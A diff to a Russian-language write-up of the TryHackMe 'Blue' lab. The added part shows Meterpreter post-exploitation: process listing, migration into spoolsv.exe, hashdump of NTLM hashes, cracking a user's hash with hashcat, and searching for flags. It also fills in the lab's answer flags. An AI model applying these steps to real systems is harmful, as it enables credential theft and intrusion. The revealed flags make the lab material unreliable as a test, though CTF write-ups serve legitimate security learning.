@@ -341,11 +341,117 @@ nt authority\system
 C:\Windows\system32>
 ```
 
+Нахожу процесс запущенный от SYSTEM:
+```bash
+C:\Windows\system32>^Z
+Background channel 1? [y/N]  y
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                Arch  Session  User                          Path
+ ---   ----  ----                ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System              x64   0
+ 416   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 460   668   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 484   716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+ 488   568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 492   716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+ 568   560   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 616   560   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 628   608   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 668   608   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 716   616   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 724   616   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 732   616   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 772   716   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
+ 844   716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+ 912   716   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+ 960   716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1116  716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1200  716   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1268  716   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1328  1268  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+ 1372  716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1452  716   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-
+             xe                                                               ssm-agent.exe
+ 1532  716   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\Li
+                                                                              teAgent.exe
+ 1620  1292  powershell.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShe
+                                                                              ll\v1.0\powershell.exe
+ 1688  716   Ec2Config.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigSe
+                                                                              rvice\Ec2Config.exe
+ 1984  716   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2080  844   WmiPrvSE.exe
+ 2228  568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2284  1620  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 2316  716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2416  568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2556  716   vds.exe             x64   0        NT AUTHORITY\SYSTEM
+ 2608  716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+ 2680  716   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM
+ 3044  716   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM
+```
+
+Выполняю миграцию в spoolsv.exe:
+```bash
+meterpreter > migrate 1268
+[*] Migrating from 1620 to 1268...
+[*] Migration completed successfully.
+meterpreter > 
+```
+
+hashdump
+```bash
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+
+Взламываю NTLM hash:
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/exploits]
+└─$ cat hash_Jon.txt 
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/exploits]
+└─$ hashcat -m 1000 -a 0  hash_Jon.txt /media/sf_Exchange/Dictionaries/rockyou.txt
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/exploits]
+└─$ hashcat -m 1000 -a 0  hash_Jon.txt --show                                     
+ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
+```
+
+Ищу в системе флаги:
+```bash
+meterpreter > search -f *flag*
+Found 6 results...
+==================
+
+Path                                                             Size (bytes)  Modified (UTC)
+----                                                             ------------  --------------
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-17 15:26:42 -0400
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-17 15:30:04 -0400
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-17 15:32:52 -0400
+c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-17 15:26:36 -0400
+c:\Windows\System32\config\flag2.txt                             34            2019-03-17 15:32:48 -0400
+c:\flag1.txt                                                     24            2019-03-17 15:27:21 -0400
+```
+
+И читаю их:
+```bash
+meterpreter > cat c:\\flag1.txt
+```
+
 
 ## 🏁 Флаги
 
-- User flag: 
-- Root flag: 
+- flag1:flag{access_the_machine} 
+- flag2:flag{sam_database_elevated_access} 
+- flag3:flag{admin_documents_can_be_valuable} 
 
 ---
 
